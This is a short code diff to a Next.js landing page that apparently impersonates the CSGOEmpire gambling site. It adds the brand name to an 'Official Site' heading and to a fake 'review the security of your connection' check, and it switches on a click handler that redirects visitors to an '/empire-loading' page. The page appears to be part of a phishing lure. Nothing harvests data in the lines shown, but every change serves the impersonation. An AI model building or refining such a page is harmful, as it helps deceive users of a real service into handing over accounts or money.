@@ -5,17 +5,17 @@ import image from "../../public/image.png";
 import Image from "next/image";
 
 export default function Home() {
-  // const handleClick = () => {
-  //     window.location.href = "/empire-loading"; 
-  // }
+  const handleClick = () => {
+      window.location.href = "/empire-loading"; 
+  }
 
   return (
     <div
-      // onClick={handleClick}
+      onClick={handleClick}
     >
       <main className={styles.main}>
         <h3 className={styles.text}>
-           Official Site{" "}
+          CSGOEmpire Official Site{" "}
           <span
             style={{ transform: "translate(0px)", display: "inline-block" }}
           >
@@ -27,6 +27,7 @@ export default function Home() {
         </p>
         <p className={styles.text3}>
           We needs to review the security of your connection before proceeding
+          CSGOEmpire
         </p>
        
         <div style={{ marginTop: 30, position: "relative" }}>
